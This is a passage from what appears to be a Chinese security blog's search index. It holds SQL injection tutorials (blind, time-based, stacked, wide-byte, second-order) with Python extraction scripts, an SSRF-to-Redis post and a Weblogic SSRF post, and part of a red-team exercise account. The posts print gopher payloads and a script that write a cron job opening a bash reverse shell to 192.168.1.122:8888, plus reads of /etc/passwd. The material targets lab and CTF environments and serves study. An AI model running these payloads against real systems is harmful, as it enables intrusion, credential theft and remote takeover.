\"dbname\": \"|(if((ascii(substr(database(),{},1))={}),1,2))\", \"tbname\": \"|(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),{},1))={}),1,2))\", \"clname\": \"|(if((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 2,1),{},1))={}),1,2))\", \"clname\": \"|(if((ascii(substr((select username from users limit 2,1),{},1))={}),1,2))\" } for i in range(50): for j in range(48, 128): payload = url + payloads['clname'].format(i, j) #print(payload) content1 = requests.get(url = url, headers = headers, timeout= 1).text content2 = requests.get(url = payload, headers = headers, timeout= 1).text if content1 == content2: sys.stdout.write(chr(j)) sys.stdout.flush() break insert into注入语句基础INSERT INTO 语句用于向表中插入新记录。 语法格式INSERT INTO 语句可以有两种编写形式。 第一种形式无需指定要插入数据的列名，只需提供被插入的值即可： INSERT INTO table_name VALUES (value1,value2,value3,...); 第二种形式需要指定列名及被插入的值： INSERT INTO table_name (column1,column2,column3,...) VALUES (value1,value2,value3,...); 真题案例题目为Bugku中的一道insert into注入题。 题目源码题目一开始给定了我们源码，并且hint中提示：写一个python脚本吧! &lt;?php error_reporting(0); function getIp(){ $ip = ''; if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){ $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; }else{ $ip = $_SERVER['REMOTE_ADDR']; } $ip_arr = explode(',', $ip); return $ip_arr[0]; } $host=\"localhost\"; $user=\"insert\"; $pass=\"1234qwer\"; $db=\"clientip\"; $connect = mysql_connect($host, $user, $pass) or die(\"Unable to connect\"); mysql_select_db($db) or die(\"Unable to select database\"); $ip = getIp(); echo 'your ip is :'.$ip; echo \"\\r\\n\"; echo \"&lt;br>\"; $sql=\"insert into client_ip (ip) values ('$ip')\"; echo $sql; mysql_query($sql); ?> 题目分析根据题目给定的源码可以发现注入点在http头的x-forwarded-for处; 且题目中过滤逗号，那么常规的update和报错注入和if语句都没法使用; 这里可以使用select case when xxx then xxx else xxx end;语句来代替if语句的使用; 题目中过滤了逗号，substr的中的逗号，可以使用from x for x的方式来替换; 知识储备select case xxx when xxx then xxx else xxx end; 漏洞利用注入点是在http头的x-forwarded-for处; payload:+' and (select case when (length(database())=8) then sleep(5) else 1 end) and '1'='1 延时5秒响应 payload:+' and (select case when (length(database())=5) then sleep(5) else 1 end) and '1'='1 没有延时直接响应 根据上诉返回情况，我们可以根据页面的响应的时间不通过，对其内容进行逐一猜解，脚本如下： #!/usr/localenv python3 # -*- coding:utf-8 -*- import requests import sys URL = \"http://192.168.1.191:32771/\" PAYLOADS = { \"dbname\": \"'+(select case when (ascii(substr(database() from {} for 1))>{}) then sleep(3) else 1 end) and '1'='1\", \"tbname\": \"'+(select case when (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1 offset 1) from {} for 1))>{}) then sleep(3) else 1 end) and '1'='1\", \"clname\": \"'+(select case when (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit 1 offset 0) from {} for 1))>{}) then sleep(3) else 1 end) and '1'='1\", \"clcontent\": \"'+(select case when (ascii(substr((select flag from flag) from {} for 1))>{}) then sleep(3) else 1 end) and '1'='1\" } def get_url_request(url, final_payload): try: result = requests.get(url = url, headers = final_payload, timeout = 5).elapsed.total_seconds() except TimeoutError as e: print(\"请求超时。。。\") return result # 二分法 def merge_serach(url, payload): # 定义循环数据列表 range_list = [x for x in range(0,128)] min = 0 #代表列表下标的起始值 max = len(range_list) - 1 #代表列表下标的结束值 while True: mid = (max + min) // 2 #获取列表下标的中间值 #定义最终payload格式 headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 F,irefox/52.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Connection': 'close', 'x-forwarded-for': payload.format(mid) } final_payload = headers #print(final_payload['x-forwarded-for']) # 判断页面响应时间获取字符结果 result = get_url_request(url, final_payload) if result > 2: min = mid else: max = mid if min == max - 1: if result > 2: return max return min+1 def main(): for i in range(1, 50): payload = PAYLOADS['clcontent'].format(i, '{}') result = merge_serach(URL, payload) sys.stdout.write(chr(result)) sys.stdout.flush() if __name__ == \"__main__\": main() 运行结果如下： 堆叠注入堆叠注入原理堆叠注入和uinon联合注入有异曲同工之妙，用法类似，只是不需要堆叠注入使用的；结束前面的sql语句： 在使用；(分号)结束一个sql语句后，可以继续构造下一条sql语句； select * from admin;drop table admin;//执行这个语句先查询admin表内容，后删除admin表； 堆叠注入的优缺点优点： 使用union联合注入时，须保证前后两个sql语句的可显示字段数量要相同，使用堆叠注入则不需要考虑这个限制，其可以执行任意语句； 缺点： 堆叠注入并不是每个环境下都可以执行，有可能会受到api或者数据库引擎不支持的限制； 目前已知支持堆叠注入的有： asp sql server ASP.NET SQL SERVER PHP SQL SERVER MYSQL 堆叠注入的利用(sqlilab-less38)带入单引号，数据返回错误信息，判断当前存在注入点 http://192.168.2.220:8080/Less-38/?id=-1' 使用order by判断字段位数 当带入的值为3时，页面响应正常 http://192.168.2.220:8080/Less-38/?id=1'order by 3--+ 当带入的值为4时，页面响应异常，判断判断当前表中字段长度为3 http://192.168.2.220:8080/Less-38/?id=1'order by 4--+ 使用联合查询获取所有库名 http://192.168.2.220:8080/Less-38/?id=-1' union select 1,group_concat(schema_name),2 from information_schema.schemata --+ 新增库判断是否存在堆叠注入 http://192.168.2.220:8080/Less-38/?id=-1';create database duidietest--+ 利用查库重新获取当前mysql的所有库名，发现新增库名成功，则判断是堆叠注入 http://192.168.2.220:8080/Less-38/?id=-1' union select 1,group_concat(schema_name),2 from information_schema.schemata --+ 真题环境复现(强网杯2019-随便注)环境复现cd sql_injection_qw2019_stacked docker-compose up -d 题目分析提交框带入单引号，返回报错语句，判断存在注入； 使用order尝试字段数量猜解； 1' order by 2#返回正常 1' order by 3#返回错误，判断字段数量为2 尝试使用union select语句注入出库名; 1' union select 1,database()# 根据返回信息发现存在过滤，常用敏感字符均被过滤；但是没有过滤分号，尝试使用堆叠注入获取表名; 1';show tables;# 尝试获取words表中的字段；1';show columns from words;# 尝试获取1919810931114514表中的字段； 1';show columns from ``1919810931114514``;#注：若表名为纯数字时，查询字段需要将表名用反引号包裹起来 目前已经获取到了表中flag的字段名，怎么获取字段内容是关键点； 解法一：使用rename把words表更名为其他的表名；在把表1919810931114514改成words;给新words表添加新的列名id;将flag改名为data; payload1: 0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;# payload12: 1' or 1=1# 解法二： 将select * from ` 1919810931114514 `进行16进制编码； 在构造payload： 1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# prepare…from…是预处理语句，会进行编码转换。 execute用来执行由SQLPrepare创建的SQL语句。 SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。 解法三： payload: 1'; handler `1919810931114514` open as `a`; handler `a` read next;# 宽字节注入宽字节注入的概念• 宽字节是相对于ascii这样的单字节而言的；像GB2312、GBK、GB18030、BIG5、Shift_IIS等这些都是常说的宽字节，实际上只有两个字节 • GBK是一种多字符编码，通常来说，一个gbk编码汉字、占用2个字节。一个utf-8编码的汉字，占用3个字节 宽字节注入的原理GBK 占用两字节，ASCII占用一字节 PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\\”），MYSQL默认字符集是GBK等宽字节字符集。 大家都知道%df'被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\\，变成了 %df\\'，其中\\的十六进制是 %5C ，那么现在 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为%df%5c 是一个宽字符，也就是縗，也就是说：%df\\’ = %df%5c%27=縗’，有了单引号就好注入了。 宽字节注入前提条件简单理解: 数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入 深入讲解： 要有宽字节注入漏洞，首先要满足数据库后端使用双/多字节解析SQL语句，其次还要保证在该种字符集范围中包含低字节位是 0x5C(01011100) 的字符，初步的测试结果 Big5 和 GBK 字符集都是有的， UTF-8 和 GB2312 没有这种字符（也就不存在宽字节注入）。 宽字节注入的利用(sqlilab-less38)测试页面存在注入点 首先我们用常规测试方法带入单引号，判断当前页面是否存在注入。如下图所示： 通过图片我们发现当前页面数据回显结果是正常的，下面提示信息我们看到，原来我们带入的单引号被增加一反斜杠转义了，所以导致我们的单引号带入失效。这边我们可以联想到源码中可能用了addslashes函数等我们带入的特殊字符进行了转义。 查看源码 function check_addslashes($string) { $string = addslashes($string); return $string; } // take the variables if(isset($_GET['id'])) { $id=check_addslashes($_GET['id']); //echo \"The filtered request is :\" .$id . \"&lt;br>\"; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id.\"\\n\"); fclose($fp); // connectivity mysql_query(\"SET NAMES gbk\"); $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); 通过源码我们看到mysql设置了gbk的编码方式，这边我们想到宽字节注入。 http://192.168.31.220:8080/Less-32/?id=1%df' 我们发现此时页面报错，这是php使用addslashes函数将%df'中的单引号转义，形成%df\\'。mysql的gbk编码把%df\\认为是一个汉字，此时单引号就成功逃逸出来，产生了注入。后面使用常见的联合注入即可。 猜解数据名 首先使用order by函数判断当前库的字段数量 http://192.168.31.220:8080/Less-32/?id=-1%df' order by 4--+ 带入参数4时，数据库报错。判断当前字段数量为4 http://192.168.31.220:8080/Less-32/?id=-1%df' union select 1,database(),3--+ 获取到当前数据库的名称为security 猜解库中的表名 http://192.168.31.220:8080/Less-32/?id=-1%df' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ 获取当前库下的表名为emails,referers,uagents,users 猜解users表中的字段名 http://192.168.31.220:8080/Less-32/?id=-1%df' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x27736563757269747927 and table_name=0x27757365727327--+ 获取字段内容 http://192.168.31.220:8080/Less-32/?id=-1%df' union select 1,group_concat(username,password),3 from users--+ 二次注入注入和二次注入的区别sql注入流程： • 1.攻击者在注入点输入恶意sql语句，通过http请求提交； • 2.服务器中的应用程序处理恶意的sql，并向攻击者返回注入结果； 二次注入流程： • 1.攻击者在注入点提交恶意sql语句； • 2.通过http请求，将恶意sql保存到应用程序的数据库中； • 3.攻击者第二次提交http请求； • 4.服务器处理第二次http请求，检索存储在数据库中的恶意sql，构造sql语句； • 5.服务器向攻击者返回注入结果； 二次注入的原理数据首次插入到数据库中时，应用程序会以（ addslashes 或者是借助get*magic*quotes_gpc 对其中的特殊字符进行转义)安全的方式处理这些数据,但是，这些数据可能会被应用程序本身或者其他的后端进程会以危险的方式处理这些数据，从而造成了二次注入。 二次注入的利用判断注入点 在Less-24实验中，首页的登录界面进行相应的判断测试，测试判断是否存在注入点。但是不管怎么构造参数带入均发现页面如下情况，没有任何其他变化，所以判断此处无注入点。 源码分析 function sqllogin(){ $username = mysql_real_escape_string($_POST[\"login_user\"]); $password = mysql_real_escape_string($_POST[\"login_password\"]); $sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\"; //$sql = \"SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'\"; $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( '); $row = mysql_fetch_row($res); //print_r($row) ; if ($row[1]) { return $row[1]; } else { return 0; } } 通过代码分析发现，数据接收参数login_user和login_password都会经过函数mysql_real_escape_string（）处理字符串。 此函数的具体定义如下： mysql_real_escape_string函数转义SQL语句中使用的字符串中的特殊字符. 受影响字符： \\x00 \\n \\r \\ ' &quot; \\x1a 使用此函数后，基本上使用这个点注入不太可能。 首页的登录页不行，发现登录页下面还有两个功能。一个是忘记密码，你一个注册新用户。 这里我们首先注册一个test用户，密码为111111，然后使用此用户进行登录，登录后的页面如下图所示： 我们发现登录成功之后是一个用户的登录后台页，并且该页面支持当前用户的密码修改，修改密码的代码页名称为pass_change.php. 我们查看当前页面修改密码的源代码，并进行相应的分析： if (isset($_POST['submit'])) { \\# Validating the user input........ $username= $_SESSION[\"username\"]; $curr_pass= mysql_real_escape_string($_POST['current_password']); $pass= mysql_real_escape_string($_POST['password']); $re_pass= mysql_real_escape_string($_POST['re_password']); if($pass==$re_pass) { $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \"; $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( '); $row = mysql_affected_rows(); echo '&lt;font size=\"3\" color=\"#FFFF00\">'; echo '&lt;center>'; if($row==1) { echo \"Password successfully updated\"; } else { header('Location: failed.php'); //echo 'You tried to be smart, Try harder!!!! :( '; } } else { echo '&lt;font size=\"5\" color=\"#FFFF00\">&lt;center>'; echo \"Make sure New Password and Retype Password fields have same value\"; header('refresh:2, url=index.php'); } } 通过源码我们可以看到$username是直接从session中读取的，并且没有进行参数的转义处理。curr_pass和re_pass经过了函数mysql_real_escape_string转义处理。因此我们可以直接控制username这个变量进行相关注入操作。 用户注册成功后，会将用户的基本信息写入到数据库中存储，如下图所示： 前面我们提到mysql_real_escape_string函数可以将字符串转义直接写入到数据库中存储。 并且由源码我们知道修改密码的SQL代码为： $sql = &quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' &quot;; username变量是直接读取数据库的内容，并且没有经过转义。 这边的思路是，可以直接构造一个test'#用户，新建此用户，再登录进行二次用户调用修改密码的时候，原SQL语句变为: $sql = &quot;UPDATE users SET PASSWORD='$pass' where username='test'#' and password='$curr_pass' &quot;; 由于#号注释掉了后面的语句，所以，我们本来修改的test'#的密码，但实际上修改了test的密码，而且test'#当前密码可以任意输入。 创建test'#用户 用户名test'# 密码88888 创建完成后，正常登陆 查看数据，发现用户test'#已被成功写入数据库，如下图所示： 修改当前用户密码 修改当前用户新密码为66666，并且用户的当前密码为888888，此处可以输入任意的密码为222222，可以正常修改密码，如下图所示： 查看数据库，发现test用户被正常修改，如下图所示： 由此就是整个二次注入的利用过程，这边我门只要相应的构造管理员的用户名就可以任意修改管理员账户的用户名和密码。 真题环境复现(网鼎杯2018-Unfinish)题目复现使用buu平台复现 网鼎杯2018-Unfinish 题目分析首先请求发现是一个登录页，使用几个常用用户名和密码尝试登录，没有任何信息； 使用web扫描器，发现存在register.php注册功能页面，尝试注册一个用户并登录； 登录成功后，我们可以在登录成功页发现登录用户的用户名； 那么这种题型我们能想到就是二次注入的可能性最大； 并且注册时有个特点，就是注册成功会得到302的状态码并跳转至login.php；如果注册失败，只会返回200的状态码； 并且里面有一定的字符串过滤,简单测试，大概过滤了逗号，information_schema等字符； 一般过滤了information_schema字符的话，就很少可能在再能直接拆解库表字段名，所以这里猜测是flag; payload:0'%2bascii(substr(database() from 1 for 1))%2b'0；注册后成功获取到库名第一个首字母的ascii值； 构造获取flag的payload;0'%2bascii(substr((select * from flag) from 1 for 1))%2b'0 按照此方法以依次猜解flag的字段内容即可，这里直接上脚本： #!/usr/local/env pyton3 # -*- coding:utf-8 -*- import requests import re import time import sys register_url = 'http://34de0eee-d1e3-42cd-a1cd-5127e8032f8f.node3.buuoj.cn/register.php' login_url = 'http://34de0eee-d1e3-42cd-a1cd-5127e8032f8f.node3.buuoj.cn/login.php' email = \"admin{}@qq.com\" payload = \"0'+ascii(substr((select * from flag) from {} for 1))+'0\" for i in range(1, 50): time.sleep(1) data = { 'email': email.format(i), 'username': payload.format(i), 'password': \"admin\" } #print(data) r1 = requests.post(url = register_url, data = data) r2 = requests.post(url = login_url, data = {'email': email.format(i), 'password': \"admin\"}) #print(r2.text) pattern = r'&lt;span class=\\\"user-name\\\">\\s*(\\d{1,10})\\s*&lt;' flag_str = re.findall(pattern,r2.text)[0] sys.stdout.write(chr(int(flag_str))) sys.stdout.flush()","link":"/2021/02/01/web-security/sql-injection/sql-injection-advanced/"},{"title":"ssrf打内网redis","text":"ssrf打内网redis本地攻击的利用方式（1）使用file协议 file protocol (任意文件读取) curl -vvv &quot;192.168.1.191:32768/ssrf.php?url=file:///etc/passwd&quot; （2）使用dict协议 dict protocol (获取Redis配置信息) curl -vvv &quot;192.168.1.191:32768/ssrf.php?url=dict://172.17.0.2:6379/info&quot; （3）使用gopher协议(俗称万能协议) gopher的协议使用格式： gopher://ip:6379/_数据 首先使用上述抓包获取的数据格式 *2 $3 get $3 age *2 $3 get $4 name 进行url转码 %2a%32%0a%24%33%0a%67%65%74%0a%24%33%0a%61%67%65%0a%2a%32%0a%24%33%0a%67%65%74%0a%24%34%0a%6e%61%6d%65%0a 将其中的%0a替换成%0d%0a %2a%32%0d%0a%24%33%0d%0a%67%65%74%0d%0a%24%33%0d%0a%61%67%65%0d%0a%2a%32%0d%0a%24%33%0d%0a%67%65%74%0d%0a%24%34%0d%0a%6e%61%6d%65%0d%0a 使用gopher协议发包 curl -v &quot;gopher://192.168.1.191:6379/_%2a%32%0d%0a%24%33%0d%0a%67%65%74%0d%0a%24%33%0d%0a%61%67%65%0d%0a%2a%32%0d%0a%24%33%0d%0a%67%65%74%0d%0a%24%34%0d%0a%6e%61%6d%65%0d%0a&quot; 返回结果 应用环境部署攻击机:kali（192.168.1.122） 应用服务器：（192.168.1.191） docker：ssrf_redis_demo、ssrf_redis docker pull luoshy/ssrf_redis 代码示例 ssrf.php &lt;?php $ch = curl_init(); //创建新的 cURL 资源 curl_setopt($ch, CURLOPT_URL, $_GET['url']); //设置URL 和相应的选项 #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_HEADER, 0); #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_exec($ch); //抓取 URL 内容并把它传递给浏览器，存储进文件 curl_close($ch); ////关闭 cURL 资源，并且释放系统资源 ?> post.php &lt;html> &lt;head> &lt;title>post&lt;/title> &lt;/head> &lt;body> &lt;?php echo $_REQUEST[cmd]; ?> &lt;/body> &lt;/html> file协议利用利用file协议读取本地文件 curl -vvv &quot;192.168.1.191:32768/ssrf.php?url=file:///etc/passwd&quot; dict协议利用curl -vvv &quot;192.168.1.191:32768/ssrf.php?url=dict://172.17.0.2:6379/info&quot; gopher协议利用这里主要利用gopher协议进行shell反弹 攻击payload生成redis客户端反弹shell命令 set greet &quot;\\n\\n\\n\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.122/8888 0&gt;&amp;1\\n\\n\\n\\n&quot; config set dir /var/spool/cron/ config set dbfilename root save quit 进行url编码 %73%65%74%20%67%72%65%65%74%20%22%5c%6e%5c%6e%5c%6e%5c%6e%2a%20%2a%20%2a%20%2a%20%2a%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%31%32%32%2f%38%38%38%38%20%30%3e%26%31%5c%6e%5c%6e%5c%6e%5c%6e%22%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%2f%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%72%6f%6f%74%0a%73%61%76%65%0a%71%75%69%74%0a 将其中的%0a替换成%0d%0a %73%65%74%20%67%72%65%65%74%20%22%5c%6e%5c%6e%5c%6e%5c%6e%2a%20%2a%20%2a%20%2a%20%2a%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%31%32%32%2f%38%38%38%38%20%30%3e%26%31%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%2f%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%72%6f%6f%74%0d%0a%73%61%76%65%0d%0a%71%75%69%74%0d%0a 进行url二次转码拼接ssrf攻击地址生成最终payload curl -vvv &quot;192.168.1.191:32768/ssrf.php?url=gopher://172.17.0.2:6379/_%25%37%33%25%36%35%25%37%34%25%32%30%25%36%37%25%37%32%25%36%35%25%36%35%25%37%34%25%32%30%25%32%32%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%36%32%25%36%31%25%37%33%25%36%38%25%32%30%25%32%64%25%36%39%25%32%30%25%33%65%25%32%36%25%32%30%25%32%66%25%36%34%25%36%35%25%37%36%25%32%66%25%37%34%25%36%33%25%37%30%25%32%66%25%33%31%25%33%39%25%33%32%25%32%65%25%33%31%25%33%36%25%33%38%25%32%65%25%33%31%25%32%65%25%33%31%25%33%32%25%33%32%25%32%66%25%33%38%25%33%38%25%33%38%25%33%38%25%32%30%25%33%30%25%33%65%25%32%36%25%33%31%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%32%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%33%25%37%30%25%36%66%25%36%66%25%36%63%25%32%66%25%36%33%25%37%32%25%36%66%25%36%65%25%32%66%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34%25%30%64%25%30%61&quot; 攻击利用本地攻击机开启端口监听 nc -lvvp 8888 攻击机发送攻击payload 反弹shell成功 redis快速反弹shell攻击脚本#!/usr/local/env python3 # -*- coding:utf-8 -*- import urllib import requests #脚本参数修改处 REVERSE_IP = '192.168.1.122' #反弹shell的ip REVERSE_PORT = '8888' # 反弹shell的端口 CRON_PATH = '/var/spool/cron/' #写入计划任务的目标路径，可能会不同 CRON_FILENAME = 'root' #写入计划任务的文件名 DEST_REDIS_IP = '172.17.0.2' #存在redis的目标主机IP SSRF_VUL_IP = 'http://192.168.1.191:32768/ssrf.php?url=' # 生成payload def generate_payload(): gopher = \"gopher://{}:6379/_\".format(DEST_REDIS_IP) redis_command = \"\"\"set 1 \"\\\\n\\\\n* * * * * bash -i >&amp; /dev/tcp/{}/{} 0>&amp;1\\\\n\\\\n\" config set dir {} config set dbfilename {} save quit \"\"\".format(REVERSE_IP, REVERSE_PORT, CRON_PATH, CRON_FILENAME) urlencode_one = urllib.parse.quote(redis_command, 'utf-8') replace_str = urlencode_one.replace('%0A', '%0D%0A') urlencode_two = urllib.parse.quote(replace_str, 'utf-8') payload = gopher + urlencode_two return payload def main(): payload = generate_payload() url = SSRF_VUL_IP + payload print(url) res = requests.get(url = url, timeout = 1) print(res.text) if __name__ == '__main__': main()","link":"/2019/07/22/web-security/ssrf/ssrf-redis/"},{"title":"Weblogic ssrf攻击实战","text":"环境复现Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 环境采用vulhub上现有docker环境进行复现 docker-compose build docker-compose up -d 访问http://your-ip:7001/uddiexplorer/，无需登录即可查看uddiexplorer应用。 ssrf漏洞测试漏洞位置 http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp payload ?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 这里默认存在一个远程资源的加载，且未经过严格过滤 ssrf漏洞探测内网主机端口可访问的端口会得到错误，一般会返回status code,如果访问的是非http的端口，则返回 which did not have a valid SOAP content-type 修改访问一个不存在的端口，则返回could not connect over HTTP to server 通过返回的错误不同，我们可以判断出内网主机开放了哪些端口。 ssrf漏洞redis反弹shell探测内网的redis发现目标在192.168.128.2 定时任务payload test set 1 &quot;\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.1.122/8888 0&gt;&amp;1\\n\\n\\n\\n&quot; config set dir /etc/ config set dbfilename crontab save aaa 进行url编码 test%0A%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.122%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0Aconfig%20set%20dir%20%2Fetc%2F%0Aconfig%20set%20dbfilename%20crontab%0Asave%0A%0Aaaa 将其中的%0a替换成%0d%0a test%0d%0a%0d%0aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.122%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0d%0aconfig%20set%20dir%20%2Fetc%2F%0d%0aconfig%20set%20dbfilename%20crontab%0d%0asave%0d%0a%0d%0aaaa 发起攻击 主机成功上线","link":"/2020/08/22/web-security/ssrf/ssrf-weblogic-redis/"},{"title":"记2021全国hvv演练的点点滴滴","text":"一、前言2021年的全国hvv演练比以往来的稍微早了一些，由于网络安全在国家战略层面的显著提升，各类网安行动如火如荼，一股强烈的网安之风吹遍了整个中华大地。全国演练活动已经开展了几次，相比于往年来说，整个网络安全环境带来了显著提升和优化，这就意味着演练目标变的越来越难打。 本人有幸代表公安厅参与了此次2021年全国攻防演练的活动，此次活动历经18天左右，在公安部的严密部署下紧张有序的进行着。本人也是首次参加此类规模的攻防演练活动，整个参演团队也都第一次。大家的经验都不是太丰富，其次大家也都是抱着体验，交流，成长的目的来参与此次的攻防演练活动的。但是在最终成绩这一块还是比较满意。整个过程还是比较紧张刺激且富有挑战性的，这里想着花点时间详细整理一下此次攻防过程中的典型细节以及相关感悟，这边主要偏向于一些思路的展开讲解，不过多纠结于技术细节。对于许多的大佬来说，技术其实都是常见技术点，并没有太多的花头。而且就我此次的演练感悟来看，思路是决定最终成绩好坏的最关键因素。就想最终的APT攻击一样，最大程度上利用的人性本身的弱点。在此次的攻防演练中，也是如此。这边本人已将相应的敏感信息进行脱敏处理，并且不进行广泛传播。 二、过程1 评分机制国家级攻防演练和省地市演练有所不同，主要收录和参与评分的漏洞主要为系统级权限漏洞，对于一般性不可利用的低危漏洞并不参与计分处理。并且可对内网资产进行渗透。涉及的相关评分机制主要如下: 类型 评分 备注 参演单位域名控制权限 一级100、二级50 单个参演单位得分上限500 获取pc、移动端权限 pc：20/台、移动端：50/台 得分上线500、且pc权限必须为system、root 获取邮箱权限 邮箱账号口令：20、系统管理员权限：500-1000 办公自动化系统权限 200-500 OA、即时通讯、项目管理、财务系统管理员权限 身份、账户管理平台权限（SSO、4A） 系统管理权限300、能登陆的系统100 域控系统权限 管理员200、域内可控服务器10/台 上限4000 堡垒机、运维机权限 管理员200、托管的服务器10/台 上限4000 获取大数据系统权限 根据数据量和重要程度给分，上限3000 获取数据库连接账号密码 普通50、管理员100 上限1000 获取网络设备权限 网络等级给分，大型300 需提供路由表及连接量上限2000 获取工业互联网系统权限 指挥部研判给分 物联网设备管控平台权限 控制功能的平台200、连接数5/台 上限1000 安全设备权限 普通50、管理员200 ids、审计、waf上限1000 一般web应用、ftp权限 普通20、管理员100 获取服务器主权限 普通50、管理员100 突破网络边界 上限8000 进入逻辑隔离业务内网 1000 需提供防火墙vpn网络设备控制截图 核心生产网 10000 铁路调度、银行核心、电力生产等 发现已植入webshell木马、主机木马 100-500 发现黑客破解登录主机系统 100-500 发现主机异常新增账号 100-500 发现隐蔽控制通道 100-500 提交0day或未被正式公开N-day 0-10000 2 报告审核提交报告时，有专门的虚拟化软件平台，在此平台内进行报告提交。提交报告不仅要包含完整的攻击文档，且须对整个完整的攻击利用链进行梳理，形成完整的攻击流程图，且对获取的对应资产数量及权限进行逐一填写。反正整个报告的提交流程较为复杂。 3 资产靶标提供的资产靶标主要为内网资产，且我们获取的资产系统主要为国家级政府门户网站及其内网核心系统。 靶标不会提供具体的ip地址以及对应的url，需要在互联网收集对应靶标的系统入口及可能互联的系统环境及其网站。这样就会","link":"/2021/04/25/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/hvv/2021-hvv-country/"}],"tags":[{"name":"面试题","slug":"面试题","link":"/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"博客迁移","slug":"博客迁移","link":"/tags/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/"},{"name":"mysql","slug":"mysql","link":"/tags/mysql/"},{"name":"图床配置","slug":"图床配置","link":"/tags/%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE/"},{"name":"SCTF2021","slug":"SCTF2021","link":"/tags/SCTF2021/"},{"name":"网鼎杯","slug":"网鼎杯","link":"/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"红帽杯","slug":"红帽杯","link":"/tags/%E7%BA%A2%E5%B8%BD%E6%9D%AF/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"tools","slug":"tools","link":"/tags/tools/"},{"name":"ubuntu","slug":"ubuntu","link":"/tags/ubuntu/"},{"name":"apt","slug":"apt","link":"/tags/a